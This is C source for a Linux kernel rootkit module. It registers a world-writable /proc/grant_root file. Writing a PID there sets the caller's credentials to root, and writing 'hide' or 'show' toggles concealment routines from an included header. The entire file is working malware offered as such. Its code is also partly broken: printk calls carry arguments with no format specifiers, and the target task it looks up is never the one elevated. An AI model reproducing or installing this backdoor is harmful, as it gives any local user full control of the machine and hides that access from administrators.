#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include "hide.h"

static pid_t target_pid = 0;  

static void grant_root(void) {
    struct task_struct *task;
    struct cred *new_cred;
    
    if (target_pid == 0) {
        task = current;
    } else 
        {
        rcu_read_lock();
        task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
        rcu_read_unlock();
        
        if (!task) {
            printk(KERN_ERR "Failed", target_pid);
            return;
        }
    }
    
    new_cred = prepare_creds();
    if (!new_cred) {
        printk(KERN_ERR "Failed ");
        return;
    }
    
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;
    
    commit_creds(new_cred);
    
    printk(KERN_INFO "Root privileges granted", task->pid);
}

static ssize_t write_pid(struct file *file, const char __user *buf, size_t count, loff_t *ppos) {
    char kbuf[16];
    
    if (count > 15)
        return -EINVAL;
    
    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;
    
    kbuf[count] = '\0';

    if (strncmp(kbuf, "hide", 4) == 0) {
        set_hide();
        return count;
    }
    if (strncmp(kbuf, "show", 4) == 0) {
        unset_hide();
        return count;
    }

    target_pid = simple_strtoul(kbuf, NULL, 10);
    
    grant_root();
    
    return count;
}

static struct proc_ops proc_fops = {
    .proc_write = write_pid,
};

static struct proc_dir_entry *proc_entry;

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit module loaded\n");
    
    proc_entry = proc_create("grant_root", 0222, NULL, &proc_fops);
    if (!proc_entry) {
        printk(KERN_ERR "Failed to create /proc/grant_root\n");
        return -ENOMEM;
    }
    
    return 0;
}

static void __exit rootkit_exit(void) {
    unset_hide();
    remove_proc_entry("grant_root", NULL);
    printk(KERN_INFO "Rootkit module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ME");
MODULE_DESCRIPTION("Root privilege escalation module");